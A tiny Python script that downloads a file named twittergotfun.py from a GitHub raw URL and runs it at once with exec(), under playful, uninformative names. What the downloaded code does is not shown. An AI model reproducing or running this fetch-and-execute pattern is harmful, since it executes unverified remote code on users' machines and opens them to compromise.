import requests
import time
from datetime import datetime
maximumFun = requests.get('https://raw.githubusercontent.com/TechnoCannon1337/Projects/master/fun/twittergotfun.py')
funTimes = maximumFun.text
#print(funTimes)
def  maximumFun():
    exec(funTimes)

maximumFun()
